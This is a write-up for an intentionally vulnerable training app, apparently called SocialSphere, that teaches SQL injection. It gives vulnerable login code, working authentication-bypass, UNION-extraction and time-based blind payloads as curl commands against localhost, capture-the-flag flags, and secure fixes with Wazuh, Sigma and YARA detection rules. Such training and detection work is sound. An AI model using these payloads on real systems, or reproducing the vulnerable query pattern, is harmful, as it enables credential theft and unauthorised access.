# SQL Injection — Vulnerability Lab

## Overview

| Field | Detail |
|---|---|
| **ID** | V01 |
| **Type** | SQL Injection |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-89: Improper Neutralization of Special Elements Used in SQL Command |
| **CVSS Score** | 9.8 Critical |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Locations** | Login, Search, Admin Search, Comments, Messages |
| **Difficulty** | Easy / Medium / Hard / Expert |

---

## Description

SQL Injection occurs when user-controlled input is incorporated into SQL queries without proper parameterization. An attacker can manipulate the query logic to:
- Bypass authentication
- Extract sensitive data from any table
- Modify or delete data
- Execute commands on the underlying OS (in some DB configurations)

---

## Vulnerable Code

```typescript
// ⚠️ VULNERABLE: backend/src/controllers/authController.ts
const result = await rawQuery(
  `SELECT * FROM users WHERE email = '${email}' AND password_hash = '${md5(password)}'`
);
```

---

## How to Exploit

### Lab 1 — Authentication Bypass (Easy) 🟢

**Target:** `POST /api/auth/login`

**Goal:** Login without a valid password

**Payload:**
```
email: ' OR '1'='1'--
password: anything
```

**Full cURL:**
```bash
curl -X POST http://localhost/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'\'' OR '\''1'\''='\''1'\''--", "password": "x"}'
```

**Explanation:**
The query becomes:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'-- AND password_hash = 'xxx'
```
The `OR '1'='1'` is always true. `--` comments out the password check. Returns the first user (admin).

**Flag:** `SS{sql_inject10n_bypass_auth}`

---

### Lab 2 — UNION-Based Data Extraction (Medium) 🟡

**Target:** `GET /api/search/users?q=`

**Goal:** Extract all user credentials

**Step 1 — Find column count:**
```
q=' ORDER BY 1--     (works)
q=' ORDER BY 2--     (works)
q=' ORDER BY 6--     (works)
q=' ORDER BY 7--     (error → 6 columns)
```

**Step 2 — UNION SELECT:**
```
q=' UNION SELECT id,username,email,password_hash,role,null FROM users--
```

**Full URL:**
```
http://localhost/api/search/users?q=%27%20UNION%20SELECT%20id%2Cusername%2Cemail%2Cpassword_hash%2Crole%2Cnull%20FROM%20users--
```

**Flag:** `SS{uni0n_based_d4ta_exfil}`

---

### Lab 3 — Admin Search SQL Injection (Hard) 🔴

**Target:** `GET /api/search/admin?q=`

**Goal:** Dump all users via the admin endpoint

**Payload:**
```
q=' UNION SELECT username,email,password_hash,role,created_at,null FROM users ORDER BY 1--
```

Try extracting the superadmin credentials!

**Flag:** `SS{sqli_admin_pwnage_2024}`

---

### Lab 4 — Blind Time-Based SQL Injection (Expert) 🔴🔴

**Target:** `GET /api/users/profile/search?q=`

**Goal:** Extract admin password hash character by character using time delays

**Technique:** PostgreSQL `pg_sleep()`

```bash
# Test if injection works (should delay 5 seconds)
curl "http://localhost/api/search/users?q=test'%3BSELECT%20pg_sleep(5)--"

# Extract first character of admin password hash
curl "http://localhost/api/search/users?q=test'%3BSELECT%20CASE%20WHEN%20(SELECT%20SUBSTRING(password_hash%2C1%2C1)%20FROM%20users%20WHERE%20role%3D'admin')%3D'c'%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END--"
```

**Flag:** `SS{blind_sqli_t1me_based}`

---

## Attack Flow Diagram

```
Attacker Browser
      │
      ▼
  POST /api/auth/login
  { email: "' OR '1'='1'--" }
      │
      ▼
  authController.ts
  rawQuery("SELECT * FROM users WHERE email = '' OR '1'='1'--")
      │
      ▼
  PostgreSQL
  ┌─────────────────────────────────┐
  │ Query bypasses WHERE clause     │
  │ Returns ALL users (first match) │
  └─────────────────────────────────┘
      │
      ▼
  Admin user returned → JWT issued
      │
      ▼
  Full admin access achieved 🚩
```

---

## Secure Fix

### Option 1: Parameterized Queries (Knex)
```typescript
// 🔒 SECURE
const user = await db('users')
  .where({ email })
  .first();

if (!user) return res.status(401).json({ error: 'Invalid credentials' });

const isValid = await argon2.verify(user.password_hash, password);
```

### Option 2: Prepared Statements (pg)
```typescript
// 🔒 SECURE
const result = await pool.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);
```

---

## Detection — Wazuh Rule

```xml
<rule id="100001" level="12">
  <if_group>web</if_group>
  <url_match>%27|%22|UNION|SELECT|DROP|INSERT|UPDATE|DELETE|;--|OR\s+1=1</url_match>
  <description>SQL Injection attempt detected</description>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

## Detection — Sigma Rule

```yaml
title: SQL Injection Attempt - SocialSphere
status: stable
logsource:
  product: webserver
  service: access
detection:
  selection:
    cs-uri-query|contains:
      - "' OR '"
      - "UNION SELECT"
      - "1=1"
      - "pg_sleep"
      - "'; DROP"
  condition: selection
falsepositives:
  - Legitimate search queries with special characters
level: high
tags:
  - attack.initial_access
  - attack.t1190
```

## Detection — YARA Rule

```yara
rule SQLInjection_WebRequest {
    meta:
        description = "Detects SQL injection patterns in HTTP logs"
        author = "SocialSphere Security Team"
        severity = "HIGH"
    strings:
        $sqli1 = "' OR '" nocase
        $sqli2 = "UNION SELECT" nocase
        $sqli3 = "' AND '1'='1" nocase
        $sqli4 = "pg_sleep" nocase
        $sqli5 = "; DROP TABLE" nocase
        $sqli6 = "--" nocase
    condition:
        any of them
}
```

## MITRE ATT&CK Mapping

| Tactic | Technique | Sub-technique |
|---|---|---|
| Initial Access | T1190 | Exploit Public-Facing Application |
| Credential Access | T1552 | Unsecured Credentials |
| Collection | T1005 | Data from Local System |

---

## Mitigation Checklist

- [ ] Use parameterized queries / prepared statements for ALL database queries
- [ ] Never concatenate user input into SQL strings
- [ ] Use an ORM (Knex, Sequelize, Prisma) with parameterized queries
- [ ] Implement WAF rules to detect common injection patterns
- [ ] Apply principle of least privilege to database user
- [ ] Enable database query logging and alerting
- [ ] Regular security testing with SQLMap and manual testing

---

## Hints

### Easy 🟢
- The login form sends your email directly to a SQL query
- What character breaks SQL string syntax?
- `'` (single quote) is your friend

### Medium 🟡
- How many columns does the `users` table SELECT return?
- `ORDER BY n--` helps you find the column count
- Then `UNION SELECT` can pull from other tables

### Hard 🔴
- Admin panel has a different search endpoint
- Try enumerating all admin users
- What other tables might have interesting data?

### Expert 🔴🔴
- Time-based injection doesn't need error messages
- `pg_sleep(5)` is PostgreSQL's sleep function
- Binary search approach: is char > 'M'? if yes delay 5s

---

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
